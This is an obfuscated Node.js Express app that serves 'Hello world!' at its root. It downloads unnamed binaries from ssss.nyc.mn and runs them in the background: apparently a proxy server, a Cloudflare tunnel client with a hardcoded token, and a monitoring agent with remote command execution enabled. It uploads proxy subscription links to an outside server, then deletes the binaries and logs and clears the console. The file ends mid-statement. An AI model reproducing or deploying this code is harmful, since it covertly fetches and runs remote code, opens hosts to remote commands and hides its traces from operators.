const _0x5aa73c=_0x1242;(function(_0x38c564,_0x1d51bd){const _0x28ae95=_0x1242,_0x101fb3=_0x38c564();while(!![]){try{const _0x3a922a=parseInt(_0x28ae95(0x14b))/0x1+parseInt(_0x28ae95(0x12a))/0x2*(-parseInt(_0x28ae95(0xe8))/0x3)+parseInt(_0x28ae95(0x10a))/0x4*(-parseInt(_0x28ae95(0x103))/0x5)+-parseInt(_0x28ae95(0xbe))/0x6+parseInt(_0x28ae95(0xcf))/0x7+parseInt(_0x28ae95(0x147))/0x8*(parseInt(_0x28ae95(0x123))/0x9)+parseInt(_0x28ae95(0x131))/0xa;if(_0x3a922a===_0x1d51bd)break;else _0x101fb3['push'](_0x101fb3['shift']());}catch(_0x4628d4){_0x101fb3['push'](_0x101fb3['shift']());}}}(_0x5c79,0xb9a54));function _0x5c79(){const _0x416b02=['automatic\x20access\x20task\x20added\x20successfully','org','none','\x20already\x20exists','scns.susns.sbs','web\x20running\x20error:\x20','PROJECT_URL','https://amd64.ssss.nyc.mn/v1','includes','pkill\x20-f\x20\x22[','http://ip-api.com/json/','quic','6nMlSSY','\x0a\x20\x20credentials-file:\x20','send','basename','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','2053','CFIP','\x20>/dev/null\x202>&1','NAME','vless','\x0aclient_secret:\x20','/api/delete-nodes','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','/vmess-argo','CFPORT','console','/api/add-subscriptions','\x20is\x20created','&fp=firefox&type=ws&host=','/vless-argo','\x20>\x20nul\x202>&1','./tmp','list.txt','https://ipapi.co/json/','child_process','fileName','forEach','415xPSaUW','2096','127.0.0.1','Error\x20reading\x20boot.log:','https://arm64.ssss.nyc.mn/bot','then','countryCode','9508gLGFUI','push','createWriteStream','writeFileSync','base64','ARGO_DOMAIN:','\x20failed:\x20','cdns.doon.eu.org','true','readFileSync','constructor','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x22\x20>\x20/dev/null\x202>&1','exec','block','Subscription\x20uploaded\x20successfully','listen','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','tunnel.json','unshift','/vmess-argo?ed=2560','clear','catch','https+local://8.8.8.8/dns-query','4149blXvif','response','https://arm64.ssss.nyc.mn/v1','scnsns','tunnel.yml','\x20successfully','random','1088216HJnBpB','ARGO_PORT','fileUrl','Skipping\x20adding\x20automatic\x20access\x20task','application/json','return\x20(function()\x20','split','2172690IJhURw','Error\x20downloading\x20files:','platform','NEZHA_SERVER','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x20is\x20running','get','win32','substring','http','test','eyJhIjoiNThjM2YzYjhhNWQ4ZGZjMzlmMWRjOTE2MDc3NDhkODciLCJ0IjoiZmM2MjY2ZDEtMjZlYy00YTg5LWIzY2MtMDk1ZDk5YmE5OWFlIiwicyI6IlltWmhOemhrWTJZdFpqYzJNeTAwTkRnNUxXSXpNR1V0TmpSa01EVXdZamRqT1RCaiJ9','\x20-c\x20\x22','App\x20is\x20running','arm','env','/config.json\x20>/dev/null\x202>&1\x20&','success','existsSync','https://arm64.ssss.nyc.mn/web','Content-Type','8443','21176kILaMD','nohup\x20','join','https://arm64.ssss.nyc.mn/agent','524945oqTgyI','--tls','Add\x20automatic\x20access\x20task\x20faild:\x20','Download\x20','xtls-rprx-vision','utf-8','firefox','tcp','\x0a\x20\x20\x20\x20','?security=tls&sni=','bind','Error\x20in\x20startserver:','\x0avless://','__proto__','https://amd64.ssss.nyc.mn/bot','toString','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','data','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','SUB_PATH','match','amd','statSync','/api/add-nodes','Empowerment\x20failed\x20for\x20','mkdirSync','2083','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','error','config.json','message','{}.constructor(\x22return\x20this\x22)(\x20)','log','4579758ktXXdL','floor','Nodes\x20uploaded\x20successfully','/dev/null','chmod','status','NEZHA_PORT','rm\x20-rf\x20','Error\x20executing\x20command:\x20','https://oooo.serv00.net/add-url','arm64','\x20-p\x20','trace','NEZHA_KEY','false','from','stringify','5927061XIhRSJ','close','length','2087','npm\x20running\x20error:\x20','/trojan-argo','TunnelSecret','sub.txt','\x20>/dev/null\x202>&1\x20&','table','charAt','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','boot.log'];_0x5c79=function(){return _0x416b02;};return _0x5c79();}const _0x4d44fe=(function(){let _0x286c1e=!![];return function(_0x3e21b2,_0x349692){const _0xb517d3=_0x286c1e?function(){if(_0x349692){const _0x4509fa=_0x349692['apply'](_0x3e21b2,arguments);return _0x349692=null,_0x4509fa;}}:function(){};return _0x286c1e=![],_0xb517d3;};}()),_0x405687=_0x4d44fe(this,function(){const _0x11207d=_0x1242,_0x39a708=function(){const _0x205600=_0x1242;let _0x41d91e;try{_0x41d91e=Function(_0x205600(0x12f)+_0x205600(0xbc)+');')();}catch(_0x11818c){_0x41d91e=window;}return _0x41d91e;},_0x4be32d=_0x39a708(),_0x34b4d6=_0x4be32d[_0x11207d(0xf7)]=_0x4be32d[_0x11207d(0xf7)]||{},_0x27f8f9=['log','warn','info','error','exception',_0x11207d(0xd8),_0x11207d(0xca)];for(let _0x2c90c2=0x0;_0x2c90c2<_0x27f8f9['length'];_0x2c90c2++){const _0x2ae6c1=_0x4d44fe[_0x11207d(0x114)]['prototype']['bind'](_0x4d44fe),_0x5c3a9a=_0x27f8f9[_0x2c90c2],_0x181b92=_0x34b4d6[_0x5c3a9a]||_0x2ae6c1;_0x2ae6c1[_0x11207d(0x158)]=_0x4d44fe[_0x11207d(0x155)](_0x4d44fe),_0x2ae6c1[_0x11207d(0x15a)]=_0x181b92['toString']['bind'](_0x181b92),_0x34b4d6[_0x5c3a9a]=_0x2ae6c1;}});_0x405687();function _0x1242(_0x35527e,_0x31dd25){_0x35527e=_0x35527e-0xb0;const _0x5a99b1=_0x5c79();let _0x405687=_0x5a99b1[_0x35527e];return _0x405687;}const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require('child_process')[_0x5aa73c(0x117)]),{execSync}=require(_0x5aa73c(0x100)),UPLOAD_URL=process[_0x5aa73c(0x140)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x5aa73c(0x140)][_0x5aa73c(0xe2)]||'',AUTO_ACCESS=process[_0x5aa73c(0x140)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x5aa73c(0x140)]['FILE_PATH']||_0x5aa73c(0xfd),SUB_PATH=process['env'][_0x5aa73c(0xb0)]||'sub',PORT=process[_0x5aa73c(0x140)]['SERVER_PORT']||process[_0x5aa73c(0x140)]['PORT']||0xbb8,UUID=process['env']['UUID']||'1b6671ce-daba-4769-a195-0a77043d3794',NEZHA_SERVER=process[_0x5aa73c(0x140)][_0x5aa73c(0x134)]||'',NEZHA_PORT=process[_0x5aa73c(0x140)][_0x5aa73c(0xc4)]||'',NEZHA_KEY=process[_0x5aa73c(0x140)][_0x5aa73c(0xcb)]||'',ARGO_DOMAIN=process[_0x5aa73c(0x140)]['ARGO_DOMAIN']||_0x5aa73c(0xe0),ARGO_AUTH=process[_0x5aa73c(0x140)]['ARGO_AUTH']||_0x5aa73c(0x13c),ARGO_PORT=process[_0x5aa73c(0x140)][_0x5aa73c(0x12b)]||0x1f41,CFIP=process[_0x5aa73c(0x140)][_0x5aa73c(0xee)]||_0x5aa73c(0x111),CFPORT=process['env'][_0x5aa73c(0xf6)]||0x1bb,NAME=process['env'][_0x5aa73c(0xf0)]||_0x5aa73c(0x126);!fs['existsSync'](FILE_PATH)?(fs[_0x5aa73c(0xb6)](FILE_PATH),console[_0x5aa73c(0xbd)](FILE_PATH+_0x5aa73c(0xf9))):console[_0x5aa73c(0xbd)](FILE_PATH+_0x5aa73c(0xdf));function generateRandomName(){const _0x40ec8f=_0x5aa73c,_0x4a4f29='abcdefghijklmnopqrstuvwxyz';let _0xf205a6='';for(let _0x32d1be=0x0;_0x32d1be<0x6;_0x32d1be++){_0xf205a6+=_0x4a4f29[_0x40ec8f(0xd9)](Math[_0x40ec8f(0xbf)](Math[_0x40ec8f(0x129)]()*_0x4a4f29['length']));}return _0xf205a6;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x5aa73c(0x149)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x5aa73c(0xd6)),listPath=path[_0x5aa73c(0x149)](FILE_PATH,_0x5aa73c(0xfe)),bootLogPath=path[_0x5aa73c(0x149)](FILE_PATH,_0x5aa73c(0xdb)),configPath=path[_0x5aa73c(0x149)](FILE_PATH,_0x5aa73c(0xba));function deleteNodes(){const _0x5f1f6f=_0x5aa73c;try{if(!UPLOAD_URL)return;if(!fs[_0x5f1f6f(0x143)](subPath))return;let _0x22f278;try{_0x22f278=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x431633=Buffer['from'](_0x22f278,_0x5f1f6f(0x10e))['toString']('utf-8'),_0x51ec06=_0x431633[_0x5f1f6f(0x130)]('\x0a')['filter'](_0x393b8f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5f1f6f(0x13b)](_0x393b8f));if(_0x51ec06['length']===0x0)return;return axios['post'](UPLOAD_URL+_0x5f1f6f(0xf3),JSON['stringify']({'nodes':_0x51ec06}),{'headers':{'Content-Type':_0x5f1f6f(0x12e)}})['catch'](_0x3190fe=>{return null;}),null;}catch(_0x19940a){return null;}}function cleanupOldFiles(){const _0x52a5a4=_0x5aa73c;try{const _0x25ae20=fs['readdirSync'](FILE_PATH);_0x25ae20[_0x52a5a4(0x102)](_0x2e1b39=>{const _0x3dc37e=_0x52a5a4,_0x455ab1=path[_0x3dc37e(0x149)](FILE_PATH,_0x2e1b39);try{const _0x37f74e=fs[_0x3dc37e(0xb3)](_0x455ab1);_0x37f74e['isFile']()&&fs['unlinkSync'](_0x455ab1);}catch(_0x28410e){}});}catch(_0x6ddaa9){}}app['get']('/',function(_0x22d914,_0x41c647){const _0x57cfdc=_0x5aa73c;_0x41c647[_0x57cfdc(0xea)]('Hello\x20world!');});async function generateConfig(){const _0x290e8a=_0x5aa73c,_0x26f19b={'log':{'access':'/dev/null','error':_0x290e8a(0xc1),'loglevel':_0x290e8a(0xde)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x290e8a(0xf1),'settings':{'clients':[{'id':UUID,'flow':_0x290e8a(0x14f)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x290e8a(0xfb),'dest':0xbba},{'path':_0x290e8a(0xf5),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x290e8a(0x152)}},{'port':0xbb9,'listen':_0x290e8a(0x105),'protocol':_0x290e8a(0xf1),'settings':{'clients':[{'id':UUID}],'decryption':_0x290e8a(0xde)},'streamSettings':{'network':_0x290e8a(0x152),'security':_0x290e8a(0xde)}},{'port':0xbba,'listen':_0x290e8a(0x105),'protocol':_0x290e8a(0xf1),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x290e8a(0xfb)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x290e8a(0xe7)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x290e8a(0x105),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x290e8a(0xf5)}},'sniffing':{'enabled':!![],'destOverride':[_0x290e8a(0x13a),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x290e8a(0x105),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x290e8a(0xd4)}},'sniffing':{'enabled':!![],'destOverride':[_0x290e8a(0x13a),'tls',_0x290e8a(0xe7)],'metadataOnly':![]}}],'dns':{'servers':[_0x290e8a(0x122)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':'blackhole','tag':_0x290e8a(0x118)}]};fs[_0x290e8a(0x10d)](path[_0x290e8a(0x149)](FILE_PATH,'config.json'),JSON[_0x290e8a(0xce)](_0x26f19b,null,0x2));}function getSystemArchitecture(){const _0x45a556=_0x5aa73c,_0x28443f=os['arch']();return _0x28443f===_0x45a556(0x13f)||_0x28443f===_0x45a556(0xc8)||_0x28443f==='aarch64'?_0x45a556(0x13f):_0x45a556(0xb2);}function downloadFile(_0x3345c5,_0x320eb8,_0x723652){const _0x58a615=_0x5aa73c,_0x348a61=_0x3345c5;!fs['existsSync'](FILE_PATH)&&fs[_0x58a615(0xb6)](FILE_PATH,{'recursive':!![]});const _0x5cbf86=fs[_0x58a615(0x10c)](_0x348a61);axios({'method':_0x58a615(0x137),'url':_0x320eb8,'responseType':'stream'})[_0x58a615(0x108)](_0x394367=>{const _0x34b50f=_0x58a615;_0x394367[_0x34b50f(0x15c)]['pipe'](_0x5cbf86),_0x5cbf86['on']('finish',()=>{const _0x12cac8=_0x34b50f;_0x5cbf86[_0x12cac8(0xd0)](),console['log'](_0x12cac8(0x14e)+path['basename'](_0x348a61)+_0x12cac8(0x128)),_0x723652(null,_0x348a61);}),_0x5cbf86['on'](_0x34b50f(0xb9),_0x43c14c=>{const _0xe8bb7=_0x34b50f;fs['unlink'](_0x348a61,()=>{});const _0x1cb2a3=_0xe8bb7(0x14e)+path[_0xe8bb7(0xeb)](_0x348a61)+_0xe8bb7(0x110)+_0x43c14c['message'];console['error'](_0x1cb2a3),_0x723652(_0x1cb2a3);});})['catch'](_0x451087=>{const _0x53f12c=_0x58a615,_0xfa33cf='Download\x20'+path[_0x53f12c(0xeb)](_0x348a61)+'\x20failed:\x20'+_0x451087[_0x53f12c(0xbb)];console['error'](_0xfa33cf),_0x723652(_0xfa33cf);});}async function downloadFilesAndRun(){const _0x5f5af8=_0x5aa73c,_0x352d40=getSystemArchitecture(),_0x2c72e3=getFilesForArchitecture(_0x352d40);if(_0x2c72e3[_0x5f5af8(0xd1)]===0x0){console[_0x5f5af8(0xbd)](_0x5f5af8(0x15e));return;}const _0x2ab4be=_0x2c72e3['map'](_0x507208=>{return new Promise((_0x28c761,_0x1359ed)=>{const _0x3f0eb8=_0x1242;downloadFile(_0x507208[_0x3f0eb8(0x101)],_0x507208[_0x3f0eb8(0x12c)],(_0x2ad57a,_0x2f3270)=>{_0x2ad57a?_0x1359ed(_0x2ad57a):_0x28c761(_0x2f3270);});});});try{await Promise['all'](_0x2ab4be);}catch(_0x1383e2){console['error'](_0x5f5af8(0x132),_0x1383e2);return;}function _0x3bdf75(_0x4d0a45){const _0x43b41e=0x1fd;_0x4d0a45['forEach'](_0x55a350=>{const _0x1a8bc9=_0x1242;fs[_0x1a8bc9(0x143)](_0x55a350)&&fs[_0x1a8bc9(0xc2)](_0x55a350,_0x43b41e,_0x59eb07=>{const _0x1c4cea=_0x1a8bc9;_0x59eb07?console[_0x1c4cea(0xb9)](_0x1c4cea(0xb5)+_0x55a350+':\x20'+_0x59eb07):console['log']('Empowerment\x20success\x20for\x20'+_0x55a350+':\x20'+_0x43b41e[_0x1c4cea(0x15a)](0x8));});});}const _0x3232f0=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x3bdf75(_0x3232f0);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1f1f9f=NEZHA_SERVER[_0x5f5af8(0xe4)](':')?NEZHA_SERVER[_0x5f5af8(0x130)](':')['pop']():'',_0x2d19f1=new Set(['443',_0x5f5af8(0x146),_0x5f5af8(0x104),_0x5f5af8(0xd2),_0x5f5af8(0xb7),'2053']),_0x4de427=_0x2d19f1['has'](_0x1f1f9f)?_0x5f5af8(0x112):_0x5f5af8(0xcc),_0x392643=_0x5f5af8(0xf2)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4de427+_0x5f5af8(0xda)+UUID;fs[_0x5f5af8(0x10d)](path[_0x5f5af8(0x149)](FILE_PATH,'config.yaml'),_0x392643);const _0x24ae0b=_0x5f5af8(0x148)+phpPath+_0x5f5af8(0x13d)+FILE_PATH+_0x5f5af8(0x135);try{await exec(_0x24ae0b),console['log'](phpName+_0x5f5af8(0x136)),await new Promise(_0x29527c=>setTimeout(_0x29527c,0x3e8));}catch(_0x5b2a76){console[_0x5f5af8(0xb9)]('php\x20running\x20error:\x20'+_0x5b2a76);}}else{let _0x37e695='';const _0x1d15b2=['443',_0x5f5af8(0x146),_0x5f5af8(0x104),_0x5f5af8(0xd2),'2083',_0x5f5af8(0xed)];_0x1d15b2[_0x5f5af8(0xe4)](NEZHA_PORT)&&(_0x37e695=_0x5f5af8(0x14c));const _0xafc020=_0x5f5af8(0x148)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x5f5af8(0xc9)+NEZHA_KEY+'\x20'+_0x37e695+_0x5f5af8(0xec);try{await exec(_0xafc020),console['log'](npmName+'\x20is\x20running'),await new Promise(_0x3d8d9a=>setTimeout(_0x3d8d9a,0x3e8));}catch(_0x296751){console['error'](_0x5f5af8(0xd3)+_0x296751);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x186db0='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+_0x5f5af8(0x141);try{await exec(_0x186db0),console[_0x5f5af8(0xbd)](webName+'\x20is\x20running'),await new Promise(_0x55bfcd=>setTimeout(_0x55bfcd,0x3e8));}catch(_0x3adafd){console[_0x5f5af8(0xb9)](_0x5f5af8(0xe1)+_0x3adafd);}if(fs[_0x5f5af8(0x143)](botPath)){let _0x3bb6bb;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x3bb6bb='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x3bb6bb=_0x5f5af8(0x11b)+FILE_PATH+'/tunnel.yml\x20run':_0x3bb6bb=_0x5f5af8(0x115)+FILE_PATH+_0x5f5af8(0xb8)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x3bb6bb+'\x20>/dev/null\x202>&1\x20&'),console[_0x5f5af8(0xbd)](botName+_0x5f5af8(0x136)),await new Promise(_0x1d27aa=>setTimeout(_0x1d27aa,0x7d0));}catch(_0x44d994){console[_0x5f5af8(0xb9)](_0x5f5af8(0xc6)+_0x44d994);}}await new Promise(_0x2859eb=>setTimeout(_0x2859eb,0x1388));}function getFilesForArchitecture(_0x465dbf){const _0x444dc6=_0x5aa73c;let _0x3600f2;_0x465dbf==='arm'?_0x3600f2=[{'fileName':webPath,'fileUrl':_0x444dc6(0x144)},{'fileName':botPath,'fileUrl':_0x444dc6(0x107)}]:_0x3600f2=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x444dc6(0x159)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x4b21ac=_0x465dbf===_0x444dc6(0x13f)?_0x444dc6(0x14a):'https://amd64.ssss.nyc.mn/agent';_0x3600f2[_0x444dc6(0x11e)]({'fileName':npmPath,'fileUrl':_0x4b21ac});}else{const _0x9af8de=_0x465dbf===_0x444dc6(0x13f)?_0x444dc6(0x125):_0x444dc6(0xe3);_0x3600f2[_0x444dc6(0x11e)]({'fileName':phpPath,'fileUrl':_0x9af8de});}}return _0x3600f2;}function argoType(){const _0x296544=_0x5aa73c;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x296544(0xe4)](_0x296544(0xd5))){fs[_0x296544(0x10d)](path['join'](FILE_PATH,_0x296544(0x11d)),ARGO_AUTH);const _0x1d97bd='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x296544(0x130)]('\x22')[0xb]+_0x296544(0xe9)+path[_0x296544(0x149)](FILE_PATH,_0x296544(0x11d))+_0x296544(0x15d)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x296544(0x11c);fs[_0x296544(0x10d)](path[_0x296544(0x149)](FILE_PATH,_0x296544(0x127)),_0x1d97bd);}else console[_0x296544(0xbd)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x1a0779=_0x5aa73c;let _0x487c89;if(ARGO_AUTH&&ARGO_DOMAIN)_0x487c89=ARGO_DOMAIN,console['log'](_0x1a0779(0x10f),_0x487c89),await _0x1fff64(_0x487c89);else try{const _0x17cc90=fs[_0x1a0779(0x113)](path[_0x1a0779(0x149)](FILE_PATH,'boot.log'),'utf-8'),_0x2df851=_0x17cc90[_0x1a0779(0x130)]('\x0a'),_0x12a93f=[];_0x2df851[_0x1a0779(0x102)](_0x6f3f5e=>{const _0x47223f=_0x1a0779,_0x1aed75=_0x6f3f5e[_0x47223f(0xb1)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1aed75){const _0x2b99b0=_0x1aed75[0x1];_0x12a93f[_0x47223f(0x10b)](_0x2b99b0);}});if(_0x12a93f[_0x1a0779(0xd1)]>0x0)_0x487c89=_0x12a93f[0x0],console['log']('ArgoDomain:',_0x487c89),await _0x1fff64(_0x487c89);else{console[_0x1a0779(0xbd)](_0x1a0779(0xf4)),fs['unlinkSync'](path[_0x1a0779(0x149)](FILE_PATH,_0x1a0779(0xdb)));async function _0xa9126(){const _0x27fdf0=_0x1a0779;try{process[_0x27fdf0(0x133)]===_0x27fdf0(0x138)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x27fdf0(0xe5)+botName[_0x27fdf0(0xd9)](0x0)+']'+botName[_0x27fdf0(0x139)](0x1)+_0x27fdf0(0x116));}catch(_0xc05097){}}_0xa9126(),await new Promise(_0x19974c=>setTimeout(_0x19974c,0xbb8));const _0x49d7d5=_0x1a0779(0x115)+FILE_PATH+_0x1a0779(0xb8)+ARGO_PORT;try{await exec(_0x1a0779(0x148)+botPath+'\x20'+_0x49d7d5+_0x1a0779(0xd7)),console[_0x1a0779(0xbd)](botName+'\x20is\x20running'),await new Promise(_0x3e8d44=>setTimeout(_0x3e8d44,0xbb8)),await extractDomains();}catch(_0x3bba78){console['error'](_0x1a0779(0xc6)+_0x3bba78);}}}catch(_0x3c4d37){console['error'](_0x1a0779(0x106),_0x3c4d37);}async function _0x3b9df9(){const _0x207cea=_0x1a0779;try{const _0x11dd9b=await axios[_0x207cea(0x137)](_0x207cea(0xff),{'timeout':0xbb8});if(_0x11dd9b['data']&&_0x11dd9b['data']['country_code']&&_0x11dd9b['data'][_0x207cea(0xdd)])return _0x11dd9b['data']['country_code']+'_'+_0x11dd9b[_0x207cea(0x15c)]['org'];}catch(_0x4ed1e0){try{const _0x464e67=await axios[_0x207cea(0x137)](_0x207cea(0xe6),{'timeout':0xbb8});if(_0x464e67[_0x207cea(0x15c)]&&_0x464e67[_0x207cea(0x15c)][_0x207cea(0xc3)]===_0x207cea(0x142)&&_0x464e67[_0x207cea(0x15c)][_0x207cea(0x109)]&&_0x464e67[_0x207cea(0x15c)]['org'])return _0x464e67[_0x207cea(0x15c)][_0x207cea(0x109)]+'_'+_0x464e67[_0x207cea(0x15c)]['org'];}catch(_0x342bef){}}return'Unknown';}async function _0x1fff64(_0x1baea0){const _0x1b77ce=await _0x3b9df9(),_0x577385=NAME?NAME+'-'+_0x1b77ce:_0x1b77ce;return new Promise(_0x303153=>{setTimeout(()=>{const _0x40bf0c=_0x1242,_0xeb2cbe={'v':'2','ps':''+_0x577385,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x40bf0c(0xde),'net':'ws','type':_0x40bf0c(0xde),'host':_0x1baea0,'path':_0x40bf0c(0x11f),'tls':'tls','sni':_0x1baea0,'alpn':'','fp':_0x40bf0c(0x151)},_0xddbf33=_0x40bf0c(0x157)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x1baea0+_0x40bf0c(0xfa)+_0x1baea0+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x577385+'\x0a\x0avmess://'+Buffer['from'](JSON[_0x40bf0c(0xce)](_0xeb2cbe))[_0x40bf0c(0x15a)]('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x40bf0c(0x154)+_0x1baea0+'&fp=firefox&type=ws&host='+_0x1baea0+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x577385+_0x40bf0c(0x153);console['log'](Buffer[_0x40bf0c(0xcd)](_0xddbf33)[_0x40bf0c(0x15a)](_0x40bf0c(0x10e))),fs['writeFileSync'](subPath,Buffer[_0x40bf0c(0xcd)](_0xddbf33)[_0x40bf0c(0x15a)](_0x40bf0c(0x10e))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x40bf0c(0x137)]('/'+SUB_PATH,(_0x52abeb,_0x260c0b)=>{const _0x24debd=_0x40bf0c,_0xebc88d=Buffer[_0x24debd(0xcd)](_0xddbf33)['toString'](_0x24debd(0x10e));_0x260c0b['set'](_0x24debd(0x145),'text/plain;\x20charset=utf-8'),_0x260c0b[_0x24debd(0xea)](_0xebc88d);}),_0x303153(_0xddbf33);},0x7d0);});}}async function uploadNodes(){const _0x2054a2=_0x5aa73c;if(UPLOAD_URL&&PROJECT_URL){const _0x2548b9=PROJECT_URL+'/'+SUB_PATH,_0x318465={'subscription':[_0x2548b9]};try{const _0x4d7495=await axios['post'](UPLOAD_URL+_0x2054a2(0xf8),_0x318465,{'headers':{'Content-Type':'application/json'}});return _0x4d7495&&_0x4d7495['status']===0xc8?(console['log'](_0x2054a2(0x119)),_0x4d7495):null;}catch(_0xc3b36f){if(_0xc3b36f['response']){if(_0xc3b36f[_0x2054a2(0x124)][_0x2054a2(0xc3)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2054a2(0x143)](listPath))return;const _0x511723=fs[_0x2054a2(0x113)](listPath,_0x2054a2(0x150)),_0x1e3035=_0x511723['split']('\x0a')['filter'](_0x59d557=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2054a2(0x13b)](_0x59d557));if(_0x1e3035['length']===0x0)return;const _0x2d89f7=JSON[_0x2054a2(0xce)]({'nodes':_0x1e3035});try{const _0x19eaa4=await axios['post'](UPLOAD_URL+_0x2054a2(0xb4),_0x2d89f7,{'headers':{'Content-Type':'application/json'}});return _0x19eaa4&&_0x19eaa4['status']===0xc8?(console[_0x2054a2(0xbd)](_0x2054a2(0xc0)),_0x19eaa4):null;}catch(_0x3d1933){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3fa039=_0x1242,_0x1be3fa=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1be3fa[_0x3fa039(0x10b)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1be3fa[_0x3fa039(0x10b)](phpPath);process['platform']===_0x3fa039(0x138)?exec('del\x20/f\x20/q\x20'+_0x1be3fa['join']('\x20')+_0x3fa039(0xfc),_0x15098f=>{const _0x1d7256=_0x3fa039;console[_0x1d7256(0x120)](),console['log'](_0x1d7256(0x13e)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x3fa039(0xc5)+_0x1be3fa['join']('\x20')+_0x3fa039(0xef),_0x5c2420=>{const _0x2cb37c=_0x3fa039;console[_0x2cb37c(0x120)](),console['log']('App\x20is\x20running'),console['log'](_0x2cb37c(0x15b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4daf0a=_0x5aa73c;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4daf0a(0xbd)](_0x4daf0a(0x12d));return;}try{const _0x3f298b=await axios['post'](_0x4daf0a(0xc7),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4daf0a(0x12e)}});return console[_0x4daf0a(0xbd)](_0x4daf0a(0xdc)),_0x3f298b;}catch(_0x236fc1){return console['error'](_0x4daf0a(0x14d)+_0x236fc1[_0x4daf0a(0xbb)]),null;}}async function startserver(){const _0x41139c=_0x5aa73c;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await 